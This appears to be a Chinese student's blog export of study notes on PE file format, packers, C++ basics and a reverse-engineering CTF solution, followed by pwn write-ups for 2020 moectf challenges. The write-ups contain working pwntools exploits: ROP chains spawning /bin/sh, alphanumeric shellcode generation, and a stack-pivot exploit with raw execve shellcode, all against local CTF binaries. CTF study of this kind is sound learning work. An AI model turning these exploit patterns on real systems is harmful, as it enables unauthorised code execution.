<p>相对于pe文件载入地址的偏移位置，其实就是一个偏移量。<br>
假设一个文件从400000h处载入，代码区块开始于401000h处，代码区块的RVA计算方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标地址401000-载入地址400000h=RVA1000h</span><br></pre></td></tr></table></figure>
<p>同样，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">虚拟地址VA=基地址ImageBase+相对虚拟地址RVA</span><br></pre></td></tr></table></figure>
<h3 id="文件偏移地址（物理地址）">文件偏移地址（物理地址）</h3>
<p>pe文件的某个数据位置相对于文件头的偏移量<br>
用十六进制工具打开文件时显示的地址就是文件偏移地址</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>CTF</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.18-2020.05.25</title>
    <url>/33337.html</url>
    <content><![CDATA[<p>从上周开始不用写周报了<br>
感觉没有监督就懒散了23333</p>
<h1>壳</h1>
<p>附加在原始程序上，通过windows加载器载入内存后，先于原始程序执行，在执行过程中对原始程序进行解密、还原，还原后把控制权还给原始程序，执行原来的代码。可以防止程序文件被非法修改或者静态反编译<br>
许多木马和病毒都喜欢用壳来保护和隐藏自己。对一些流行的壳，杀毒引擎先对目标软件进行脱壳，再进行病毒检查；对大多数私人壳，杀毒软件不会开发解压引擎，而是直接当成木马或病毒处理，因此，商业软件出于兼容性的考虑，很少使用加壳保护，而在其他方面提高软件保护强度<br>
不同的外壳侧重方面不一样，有的侧重压缩，有的侧重加密，还有一些提供额外的功能，如注册机制、使用次数、时间限制等</p>
<span id="more"></span>
<h2 id="压缩引擎">压缩引擎</h2>
<p>一些加壳软件调用现成的压缩引擎对文件进行压缩，在选择压缩引擎时要保证解压速度快，这样加了壳的文件运行速度才不会受到太大影响</p>
<h3 id="压缩壳">压缩壳</h3>
<ol>
<li>upx</li>
<li>ASPack</li>
</ol>
<h3 id="加密壳">加密壳</h3>
<ol>
<li>ASProtect</li>
<li>Armadillo</li>
<li>EXECryptor</li>
<li>Themida</li>
</ol>
<h1>虚拟机保护</h1>
<p>许多解释性的语言，如java的jvm。这里讨论的虚拟机（与vmware不同）将一系列指令解释成字节码后放在一个解释引擎中执行，从而对软件进行保护。</p>
<h2 id="虚拟机引擎">虚拟机引擎</h2>
<p>一个虚拟机引擎由编译器、解释器和虚拟cpu组成，还会搭配一个或多个指令系统。虚拟机在运行时，现根据自定义的指令系统把已知的指令解释成字节码并放在pe文件中，然后将原始代码删除，改成直接进入虚拟机执行。<br>
挑事者跟踪并进入虚拟机后很难理解原始指令。想要理解程序就必须对虚拟机引擎进行分析<br>
虚拟机技术以效率换取安全，一条指令经过虚拟机处理，体积会膨胀几十几百倍。因此，VM保护通常经过sdk方式，只把较为重要的代码保护起来</p>
<h1>c++</h1>
<h2 id="输入和输出">输入和输出</h2>
<p>可以用scanf和printf，也可用c++中增加的输入输出库<br>
如果要使用输入输出时，需要包含头文件：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>使用cin和count进行输入和输出</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    cin&gt;&gt;x;<span class="comment">//多输出：cin&gt;&gt;x&gt;&gt;y;</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;The int number is x= &quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//endl即end of line 表示结尾进行换行</span></span><br></pre></td></tr></table></figure>
<p>cin和count这两个运算符可以自行分析处理（强制转换）数据类型，因此无需像使用scanf和printf那样给出格式控制字符串。</p>
<h2 id="new和delete">new和delete</h2>
<p>用来动态分配内存和释放内存</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>;  <span class="comment">//分配1个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span> p;  <span class="comment">//释放内存</span></span><br><span class="line"><span class="comment">//以及</span></span><br><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];  <span class="comment">//分配10个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span>[] p;</span><br></pre></td></tr></table></figure>
<h2 id="类和对象">类和对象</h2>
<p>类只是一种数据类型，本身并不占用空间</p>
<h3 id="定义">定义</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span><span class="comment">//关键字class专门用来定义类，Student是类的名称，类名首字母一般大写</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//表示类的成员具有公开的访问权限，其他还有private等</span></span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;name&lt;&lt;<span class="string">&quot;的年龄是&quot;</span>&lt;&lt;age&lt;&lt;<span class="string">&quot;，成绩是&quot;</span>&lt;&lt;score&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">LLL</span>;</span><span class="comment">//创建对象 ，class可不要，LLL也可为数组</span></span><br><span class="line"><span class="comment">// 用.访问成员</span></span><br><span class="line"><span class="comment">//与结构体贼相似</span></span><br></pre></td></tr></table></figure>
<h3 id="对象指针">对象指针</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在栈上分配内存</span></span><br><span class="line">Student stu;</span><br><span class="line">Student *pStu = &amp;stu;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在堆上分配内存</span></span><br><span class="line">Student *pStu = <span class="keyword">new</span> Student;</span><br><span class="line"><span class="comment">//访问时通过&quot;-&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="成员变量和成员函数">成员变量和成员函数</h3>
<p>在类中直接定义函数时，不需要在函数名前加类名；当成员函数定义在类外时，要在函数名前加类名</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::say</span><span class="params">()</span></span>&#123;<span class="comment">// 如果写成inline void Student::say 就为内联函数</span></span><br><span class="line">    <span class="comment">//::是域解析符（作用域运算符、作用域限定符）用来连接类名和函数名</span></span><br><span class="line">    cout&lt;&lt;name&lt;&lt;<span class="string">&quot;的年龄是&quot;</span>&lt;&lt;age&lt;&lt;<span class="string">&quot;，成绩是&quot;</span>&lt;&lt;score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>在类体中定义的成员函数会自动成为内联函数，在类体外定义的不会</strong><br>
内联函数会将函数调用处用函数体代替，所以尽量在类内部作声明，在类外对函数定义</p>
<blockquote>
<p>函数调用是有时间和空间开销的。程序在执行一个函数之前需要将实参、局部变量、返回地址以及若干寄存器都压入栈中，然后才能执行函数体中的代码；执行完之后，还要将之前压入栈中的数据都出栈，才能接着执行函数调用位置以后的代码。<br>
如果函数体代码比较多，需要较长的执行时间，那么函数调用机制占用的时间可以忽略；如果函数只有一两句语句，那么大部分的时间都会花费在函数调用机制上，这种时间开销就不容忽视。<br>
为了消除函数调用的时空开销，C++在编译时将函数调用处用函数体替换，即内联函数。<br>
内联函数的缺点：编译后的程序会存在多份相同的函数拷贝。<br>
内联函数的代码在编译后就被消除了</p>
</blockquote>
<h3 id="类成员的访问权限和类的封装">类成员的访问权限和类的封装</h3>
<p>控制成员的访问权限：成员访问限定符public、protected、private<br>
在类的内部，成员可以互相访问；在类的外部，只能通过对象访问public属性的成员<br>
约定成员变量以*m_*开头，可以直接看出是成员变量，又可以和成员函数中的形参名字区分</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:  <span class="comment">//私有的</span></span><br><span class="line">    <span class="keyword">char</span> *m_name;</span><br><span class="line">    <span class="keyword">float</span> m_score;</span><br><span class="line"><span class="keyword">public</span>:  <span class="comment">//共有的</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    m_name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>&#123;</span><br><span class="line">    m_score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//在栈上创建对象</span></span><br><span class="line">    Student stu;</span><br><span class="line">    stu.<span class="built_in">setname</span>(<span class="string">&quot;小明&quot;</span>);</span><br><span class="line">    stu.<span class="built_in">setscore</span>(<span class="number">92.5f</span>);</span><br><span class="line">    <span class="comment">//在堆上创建对象</span></span><br><span class="line">    Student *pstu = <span class="keyword">new</span> Student;</span><br><span class="line">    pstu -&gt; <span class="built_in">setname</span>(<span class="string">&quot;李华&quot;</span>);</span><br><span class="line">    pstu -&gt; <span class="built_in">setscore</span>(<span class="number">96</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面的写法是错误的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stu.m_name = <span class="string">&quot;小明&quot;</span>;</span><br><span class="line">stu.m_score = <span class="number">92.5f</span>;</span><br><span class="line">stu.<span class="built_in">show</span>();</span><br></pre></td></tr></table></figure>
<p>因为私有的成员变量不能通过对象直接访问，必须借助public属性的成员函数来修改</p>
<h4 id="类的封装">类的封装</h4>
<p>private：作用在于更好的隐藏内部的实现，不希望外部知道或只在内部使用的成员声明为private<br>
public：向外部暴露的接口声明为public//如上面的setname()和setscore()<br>
（实际项目开发中，成员变量都建议声明为private，只将允许通过对象对用的成员函数声明为public）<br>
protected：在类外也不能通过对象访问，但在派生类内部可以访问</p>
<blockquote>
<p>给成员变量赋值的函数通常以set开头；读取成员变量的值的函数通常以get开头</p>
</blockquote>
<p>private 和 public的使用体现了类的封装性，即：尽量隐藏类的内部实现，只向用户提供有用的成员函数。</p>
<h3 id="构造函数">构造函数</h3>
<p>一种特殊的成员函数，名称与类名完全相同，可用于对某些成员变量设置初始值。创建对象时系统会自动调用构造函数进行初始化工作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Line::<span class="built_in">Line</span>( <span class="keyword">double</span> len，<span class="keyword">int</span> age, <span class="keyword">float</span> score): <span class="built_in">length</span>(len)<span class="comment">//构造函数，也可以对多个成员变量进行赋值</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//相当于</span></span><br><span class="line">Line::<span class="built_in">Line</span>( <span class="keyword">double</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    length = len;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="初始化const成员变量">初始化const成员变量</h4>
<p>如：对下面m_len的初始化</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VLA</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> m_len;</span><br><span class="line">    <span class="keyword">int</span> *m_arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">VLA</span>(<span class="keyword">int</span> len);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>只能使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">VLA::<span class="built_in">VLA</span>(<span class="keyword">int</span> len):<span class="built_in">m_len</span>(len)&#123;</span><br><span class="line">    m_arr=<span class="keyword">new</span> <span class="keyword">int</span>[len]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//而不能：</span></span><br><span class="line">VLA::<span class="built_in">VLA</span>(<span class="keyword">int</span> len)&#123;</span><br><span class="line">    m_len = len;</span><br><span class="line">    m_arr = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>堆和栈的区别</h1>
<ol>
<li>内存分配<br>
堆由程序员分配和释放；栈由编译器自动分配</li>
<li>申请方式<br>
堆：用malloc、new申请；栈：如int a</li>
<li>大小限制<br>
堆：向高地址扩展，用不连续的内存空间存储。大小受到系统虚拟内存大小的限制，因此获得的空间比较大<br>
栈：向低地址扩展，一块连续的内存空间。栈的大小是固定的，能申请的空间比较小</li>
<li>效率<br>
堆：速度慢，容易产生内存碎片<br>
栈：系统分配，速度快</li>
</ol>
<h1>攻防世界逆向题</h1>
<h2 id="getit">getit</h2>
<p>首先放到ida里看伪代码<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSEUs.png" alt="tSSEUs.png"><br>
其中<br>
t存放的是“SharifCTF{???}”<br>
u存放的是“*******************************************”<br>
s存放的是“c61b68366edeb7bdce3c6820314b7498”<br>
并且s的长度和t里的?一样；“SharifCTF{”长度为10<br>
整段伪代码大概就是：<br>
先改变t里每个?的值，然后输出到文件，然后再改变整个t，再输出一次，最后把这个文件删了<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSAEj.png" alt="tSSAEj.png"><br>
在第一次输出时伪代码是：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(stream, <span class="string">&quot;%s\n&quot;</span>, u, v5);</span><br></pre></td></tr></table></figure>
<p>只有一个%s，看起来只输出了u，并没有输出v5</p>
<p>在第二次输出时用到了fseek(),其作用是将文件的指针移动：<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSwrD.png" alt="tSSwrD.png"></p>
<p>由于u的内容一直都是&quot;<em>…</em>**<em>…</em>&quot;，那么也就是说存放flag的t被最后一个循环覆盖为了一堆 *<br>
综上，flag应该出现在第一次输出时的t里，得到flag的过程为程序的第一个循环，可以得到代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">50</span>]=<span class="string">&quot;c61b68366edeb7bdce3c6820314b7498&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> v=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> v3;</span><br><span class="line">	<span class="keyword">char</span> t[<span class="number">50</span>]=<span class="string">&quot;SharifCTF&#123;????????????????????????????????&#125;&quot;</span>; </span><br><span class="line">	<span class="keyword">while</span>((<span class="keyword">signed</span> <span class="keyword">int</span> )v&lt;<span class="built_in">strlen</span>(s))&#123;</span><br><span class="line">		<span class="keyword">if</span>(v&amp;<span class="number">1</span>)</span><br><span class="line">			v3=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			v3=<span class="number">-1</span>;</span><br><span class="line">		*(t+(<span class="keyword">signed</span> <span class="keyword">int</span>)v+<span class="number">10</span>)=s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v]+v3;</span><br><span class="line">		<span class="comment">//从&#123;后面开始修改数组t的内容 </span></span><br><span class="line">		v=v+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>CTF</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.07.06-2020.07.12</title>
    <url>/36664.html</url>
    <content><![CDATA[<h2 id="MS-DOS头部">MS-DOS头部</h2>
<p>每一个pe文件都以一个dos程序开始。程序在dos下执行，dos就能识别出这是一个有效的执行体，然后运行MZ header的DOS stub（dos块）。DOS stub是一个有效的exe，大多数情况下由编译器或汇编器自动生成。通常把DOS MZ头和DOS stub合称为DOS文件头。<br>
PE文件的第一个字节位于MS-DOS头部，称作IMAGE_DOS_HEADER，其中有两个字段：e_magic和e_lfanew。</p>
<span id="more"></span>
<ul>
<li>
<p>e_magic的值被设为5A4Dh,ASCII值为MZ</p>
</li>
<li>
<p>e_lfanew指出真正的PE文件头的相对偏移位置，占4字节，在文件开始偏移3Ch字节处。</p>
</li>
</ul>
<h2 id="PE文件头部">PE文件头部</h2>
<p>紧接着DOS stub的是PE文件头。PE文件头是PE相关结构NT映像头的简称，其中包含许多PE装载器能用到的重要字段。当执行体在支持PE文件结构的操作系统中执行是，PE装载器将从IMAGE_DOS_HADER结构的e_lfanew字段中找到PE文件头的起始偏移量，加上基址就得到PE文件头的指针。<br>
IMAGE_DOS_HEADER有两个版本，一个是为32位（PE32）可执行文件准备的,另一个是64位（PE32+）的，两个几乎没有区别。<br>
IMAGE_DOS_HEADER中有3个字段：</p>
<h3 id="Signature字段">Signature字段</h3>
<p>在一个有效的PE文件里，Signature字段被设置为0x00004550，对应ASCII字符为PE00<br>
MS-DOS头部的e_lfanew正是指向这个字段</p>
<h3 id="FileHeader字段">FileHeader字段</h3>
<p>IMAGE_FILE_HEADER（映像头文件）结构包含PE文件的一些基本信息和这个结构的大小。<br>
结构的各个字段包括：</p>
<ol>
<li>
<p>Machine：可执行文件的目标cpu类型</p>
</li>
<li>
<p>NumberOfSection：区块的数目</p>
</li>
<li>
<p>TimeDateStamp：文件创建时间</p>
</li>
<li>
<p>PointerToSymbolTable：COFF符号表的文件偏移位置</p>
</li>
<li>
<p>NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，可以用来找到COFF符号表的结束处</p>
</li>
<li>
<p>SizeOfOptionalHeader：表示数据的大小，依赖于文件是32位还是64位</p>
</li>
<li>
<p>Characteristics：文件属性，定义域winnt.h内的IMAGE_FILE_xxx值</p>
</li>
</ol>
<h3 id="OptionalHeader字段">OptionalHeader字段</h3>
<p>定义PE文件的其他属性</p>
<h2 id="区块">区块</h2>
<p><img src="https://s1.ax1x.com/2020/07/10/UMsx29.png" alt="UMsx29.png"><br>
<img src="https://s1.ax1x.com/2020/07/10/UMszvR.png" alt="UMszvR.png"></p>
<h3 id="区块表">区块表</h3>
<p>区块表是一个IMAGE_SECTION_HEADER结构数组，每个区块表结构包含了它所关联的区块的信息，例如位置、长度等，数组的数目由IMAGE_NT_HEADERS.FileHeader.NumberOfSection指出。</p>
<h3 id="常见区块与区块合并">常见区块与区块合并</h3>
<p>链接器能够合并区块，优点是节省空间。每个区块至少占用一个内存页，将两个区块合并就有可能少用一个内存页。<br>
部分在载入内存时由Windows加载器写入的输入数据可能会被放入只读区块，因为在加载时，系统会临时修改那些包含输入数据的页属性为可读可写，初始化完成后恢复为原来的属性</p>
<h3 id="区块对齐值">区块对齐值</h3>
<p>区块有两种对齐值，一种用于磁盘文件内，一种用于内存，两者可以不同。<br>
PE文件头里的FileAlignment定义了<em>磁盘区块</em>的对齐值。在不足的地方（区块间隙）用00h填充<br>
PE文件头里的SectionAlignment定义了<em>内存区块</em>的对齐值。当PE文件被映射到内存中时，区块总是至少从一个页边界处开始，即每个区块的第一个字节对应于某个内存页。<br>
建立一个区块在文件中的偏移和内存中的偏移相同的PE文件，可以提高载入速度并使文件变大</p>
<h3 id="文件偏移与虚拟地址的转换">文件偏移与虚拟地址的转换</h3>
<p>对于磁盘对齐值和内存页不同的区块，同一数据在磁盘文件中的偏移和在内存中的偏移不同，需要进行转换。<br>
<img src="https://s1.ax1x.com/2020/07/15/U010qs.png" alt="U010qs.png"><br>
文件被映射到内存中时，MS-DOS头部、PE文件头和块表的偏移位置和大小没有变化，而各区块被映射到内存后偏移位置发生变化</p>
<h2 id="输入表">输入表</h2>
<p>可执行文件使用来自其他DLL的代码或数据的动作称为输入。当PE文件被载入时，加载器的工作之一就是定位所有被输入的函数和数据，并让文件可以使用那些地址。这个过程通过PE文件的输入表Import Table完成。输入表中保存的是函数名和其驻留的DLL名等动态链接所需的信息。</p>
<h3 id="输入函数的调用">输入函数的调用</h3>
<p>输入函数被程序调用，但执行代码不在程序中。这些函数的代码位于相关的DLL文件中，在程序中只保留函数信息如函数名、DLL文件名等。磁盘上的PE文件无法得知这些输入函数在内存中的地址，只有当载入内存后，加载器才将相关DLL载入，并将函数地址和调用的指令联系起来</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>部分pwn题wp</title>
    <url>/26411.html</url>
    <content><![CDATA[<p>主要是大二上刚开学做的题</p>
<span id="more"></span>
<h1>2020moectf部分pwn</h1>
<h2 id="rop1">rop1</h2>
<p>wp:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x400670</span></span><br><span class="line">binsh = <span class="number">0x00601070</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0400933</span>) + p64(binsh) + p64(sys) </span><br><span class="line"><span class="comment">#400933为‘pop rdi,ret’</span></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<!--more-->
<p>需要注意到，这题是x64的，跟x86的做法（ctfwiki-basicROP-ret2libc1）有些不同。<br>
x64调用函数传递参数时先使用rdi、rsi、rdx、rcx、r8、r9（储存整数和指针）等，再用栈</p>
<h2 id="rop2">rop2</h2>
<p>wp:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop2&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x0400670</span></span><br><span class="line">gets = <span class="number">0x04006b0</span></span><br><span class="line">pop_rdi = <span class="number">0x0400933</span></span><br><span class="line">bss = <span class="number">0x006010A8</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(sys)</span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>卡在少了最开始的p64(pop_rdi) + p64(bss)</p>
<p>学长的解释是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">改变rdi的gadget地址 使其指向bss段的那个地址 </span><br></pre></td></tr></table></figure>
<h2 id="unusual">unusual</h2>
<p>用alpha3弄出一个Alphanumeric Shellcode</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span> asm(sc)</span><br><span class="line"><span class="comment">#sc.py</span></span><br><span class="line"></span><br><span class="line">python sc.py &gt; sc</span><br><span class="line"></span><br><span class="line">python alpha3/ALPHA3.py x64 <span class="built_in">ascii</span> mixedcase rax --<span class="built_in">input</span>=<span class="string">&quot;sc&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="hard-shelcode">hard_shelcode</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">sh = process(<span class="string">&quot;./hard_shellcode&quot;</span>)</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sub_rsp = asm(<span class="string">&#x27;sub rsp, 64&#x27;</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">&#x27;jmp rsp&#x27;</span>)</span><br><span class="line">gadget = <span class="number">0x04000EA</span></span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">&#x27;a&#x27;</span>*(<span class="number">64</span>-<span class="built_in">len</span>(sc)) + sub_rsp + jmp_rsp + <span class="string">&#x27;b&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(sub_rsp)-<span class="built_in">len</span>(jmp_rsp)) + gadget</span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27;*16 + sc + sub_rsp + jmp_rsp + &#x27;b&#x27;*(8-len(sub_rsp)-len(jmp_rsp)) + p64(gadget) </span></span><br><span class="line"><span class="comment">## sub rsp,48</span></span><br><span class="line"> </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>用gadget跳转到&quot;sub_rsp,jmp_rsp&quot;然后执行sc(shellcode)</p>
<h2 id="baby-migration">baby_migration</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./baby_migration&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x4011C8</span></span><br><span class="line">rbp = <span class="number">0x404060</span></span><br><span class="line"><span class="comment">#shell = asm(shellcraft.sh())</span></span><br><span class="line">shell = <span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span> + p64(rbp+<span class="number">300</span>) + p64(gets) </span><br><span class="line">payload2 = shell + <span class="string">&#x27;b&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(shell)) + p64(rbp ) + p64(rbp+<span class="number">300</span>-<span class="number">0x30</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTgwMzAuaHRt">https://bbs.pediy.com/thread-258030.htm<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YW55dW5mZW5nMy9hcnRpY2xlL2RldGFpbHMvNTE0NTYwNDk=">https://blog.csdn.net/yuanyunfeng3/article/details/51456049<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">栈迁移 的核心思想就是 将栈 的 esp 和 ebp 转移到一个 输入不受长度限制的 且可控制 的 址处，通常是 bss 段地址！ 在最后 ret 的时候 如果我们能够控制得 了 栈顶 esp指向的地址 就想到于 控制了 程序执行流！</span><br></pre></td></tr></table></figure>
<p>用pwntolls生成的shellcode执行不了，可能是因为太长？</p>
<h2 id="baby-canary">baby_canary</h2>
